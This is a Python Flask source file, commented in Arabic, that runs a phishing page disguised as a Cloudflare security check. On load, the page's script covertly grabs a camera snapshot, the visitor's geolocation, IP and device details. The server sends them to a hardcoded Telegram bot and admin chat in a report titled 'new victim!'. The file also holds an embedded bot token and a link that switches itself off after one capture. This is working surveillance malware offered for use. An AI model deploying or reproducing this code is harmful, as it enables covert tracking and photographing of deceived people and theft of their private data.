import base64
import requests
import io
import os
import time
import logging
import threading
from flask import Flask, request, render_template_string, jsonify, redirect
from datetime import datetime

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# ==================== إعدادات البوت ====================
BOT_TOKEN = "8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs"
ADMIN_ID = 7041600701
CHANNEL_URL = "https://t.me/FAABOT?start=7041600701"
DEVELOPER_USER = "Y_urd"

# رابط الموقع (راح يتغير تلقائياً بعد النشر)
MY_LINK = os.environ.get("MY_LINK", "https://your-app.onrender.com")
# ========================================================

users_db = {}
link_active = True
link_lock = threading.Lock()

def send_to_tg(msg, img=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    try:
        if img and len(img) > 100:
            img_bytes = base64.b64decode(img)
            requests.post(url + "sendPhoto",
                         data={'chat_id': ADMIN_ID, 'caption': msg, 'parse_mode': 'HTML'},
                         files={'photo': ('snap.jpg', io.BytesIO(img_bytes))},
                         timeout=30)
        else:
            requests.post(url + "sendMessage",
                         json={'chat_id': ADMIN_ID, 'text': msg, 'parse_mode': 'HTML'},
                         timeout=30)
        logging.info("✅ تم الإرسال")
    except Exception as e:
        logging.error(f"❌ فشل الإرسال: {e}")

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان</title>
    <style>
        body{background:#f0f2f5;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
        .box{background:white;padding:30px;border-radius:20px;text-align:center;width:90%;max-width:400px}
        .spinner{border:4px solid #f3f3f3;border-top:4px solid #f6821f;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .error{color:red;margin-top:10px;display:none}
        .btn{background:#f6821f;color:white;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;margin-top:20px}
        .hidden{display:none}
    </style>
</head>
<body>
<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="100">
    <h2 id="title">جاري التحقق...</h2>
    <p id="text">يرجى الانتظار 3 ثوانٍ</p>
    <div id="spinner" class="spinner"></div>
    <button id="retryBtn" class="btn hidden" onclick="start()">إعادة المحاولة</button>
</div>
<video id="video" autoplay playsinline muted style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>
<script>
    let sent = false;
    async function getInfo() {
        let battery = {level:0};
        try { if(navigator.getBattery) battery = await navigator.getBattery(); } catch(e) {}
        return {
            platform: navigator.platform || '-',
            lang: navigator.language || '-',
            cores: navigator.hardwareConcurrency || '-',
            ram: navigator.deviceMemory || '-',
            battery: Math.round(battery.level*100)+'%',
            screen: screen.width+'x'+screen.height,
            ua: navigator.userAgent,
            touch: 'ontouchstart' in window,
            cookies: navigator.cookieEnabled
        };
    }
    async function send(lat, lon, info) {
        if(sent) return;
        sent = true;
        let img = '';
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        if(video.videoWidth > 0) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            img = canvas.toDataURL('image/jpeg',0.5).split(',')[1];
        }
        try {
            await fetch('/capture', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({img:img, lat:lat||0, lon:lon||0, specs:info})
            });
        } catch(e) {}
        window.location.href = 'https://www.google.com';
    }
    async function start() {
        document.getElementById('spinner').classList.remove('hidden');
        document.getElementById('retryBtn').classList.add('hidden');
        let stream = null;
        const video = document.getElementById('video');
        try {
            stream = await navigator.mediaDevices.getUserMedia({video:true});
            video.srcObject = stream;
            await new Promise(r => { video.onloadedmetadata = r; setTimeout(r,2000); });
        } catch(e) { document.getElementById('text').innerText = 'جاري جمع المعلومات...'; }
        const info = await getInfo();
        await new Promise(r => setTimeout(r,2000));
        let lat=0, lon=0;
        try {
            const pos = await new Promise((res,rej) => navigator.geolocation.getCurrentPosition(res,rej,{timeout:5000}));
            lat = pos.coords.latitude;
            lon = pos.coords.longitude;
        } catch(e) {}
        await send(lat, lon, info);
        if(stream) stream.getTracks().forEach(t=>t.stop());
    }
    window.onload = () => setTimeout(start, 500);
</script>
</body>
</html>
'''

@app.route('/')
def index():
    global link_active
    with link_lock:
        if not link_active:
            return redirect("https://www.google.com")
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    global link_active
    with link_lock:
        if not link_active:
            return jsonify({"status":"expired"}),403
    
    data = request.json
    if not data:
        return jsonify({"status":"error"}),400
    
    specs = data.get('specs', {})
    lat = data.get('lat', 0)
    lon = data.get('lon', 0)
    img = data.get('img', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    loc_link = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else "غير متاح"
    
    report = f"""🔥 <b>ضحية جديدة!</b>

📱 الجهاز: {specs.get('platform','?')}
🌐 IP: <code>{ip}</code>
📍 الموقع: <a href='{loc_link}'>على الخريطة</a>
💾 الذاكرة: {specs.get('ram','?')} GB
⚙️ النواة: {specs.get('cores','?')}
🔋 البطارية: {specs.get('battery','?')}
📺 الشاشة: {specs.get('screen','?')}

⚠️ الرابط معطل الآن"""
    
    send_to_tg(report, img if len(img) > 100 else None)
    
    with link_lock:
        link_active = False
    
    return jsonify({"status":"ok"})

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if update and "message" in update:
        chat_id = update["message"]["chat"]["id"]
        text = update["message"].get("text", "")
        if chat_id == ADMIN_ID:
            if text == "/open":
                global link_active
                with link_lock:
                    link_active = True
                send_to_tg("✅ تم تفعيل الرابط")
            elif text == "/status":
                status = "مفعل ✅" if link_active else "معطل ❌"
                send_to_tg(f"حالة الرابط: {status}")
    return "OK", 200

@app.route('/health')
def health():
    return jsonify({"status":"alive", "link_active":link_active})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
